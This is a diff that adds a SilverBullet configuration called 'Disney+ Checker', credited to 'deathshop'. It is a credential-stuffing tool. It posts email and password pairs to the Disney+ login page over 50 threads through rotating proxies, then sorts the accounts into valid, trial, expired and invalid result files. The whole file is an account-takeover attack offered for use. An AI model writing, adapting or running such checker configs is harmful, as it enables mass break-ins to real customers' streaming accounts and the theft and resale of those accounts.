@@ -1,0 +1,57 @@
+# Disney+ Checker
+# SilverBullet Config
+# by deathshop
+
+[Info]
+Name=Disney+ Checker
+Version=1.0
+Author=deathshop
+Site=https://deepseek.pornhub.com
+
+[Main]
+Method=POST
+URL=https://www.disneyplus.com/login
+Referer=https://www.disneyplus.com/login
+Origin=https://www.disneyplus.com
+UserAgent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Threads=50
+Timeout=10
+Retry=2
+
+[Data]
+email=login_form[email]
+password=login_form[password]
+csrf_token=csrf_token
+authenticity_token=authenticity_token
+commit=Sign In
+utf8=✓
+
+[Valid]
+Keywords=account,home,browse,logout,sign out,subscription,profile
+Redirect=account,home,browse
+Type=Account
+
+[Invalid]
+Keywords=invalid,incorrect,wrong,password,email,try again
+Type=Bad
+
+[Trial]
+Keywords=trial,free trial,start trial
+Type=Trial
+
+[Expired]
+Keywords=expired,renew,payment
+Type=Expired
+
+[Proxy]
+Enable=True
+Type=HTTP
+Format=IP:PORT
+TestURL=https://www.disneyplus.com
+
+[Output]
+Valid=result/disney_valid.txt
+Invalid=result/disney_invalid.txt
+Error=result/disney_error.txt
+Trial=result/disney_trial.txt
+Expired=result/disney_expired.txt
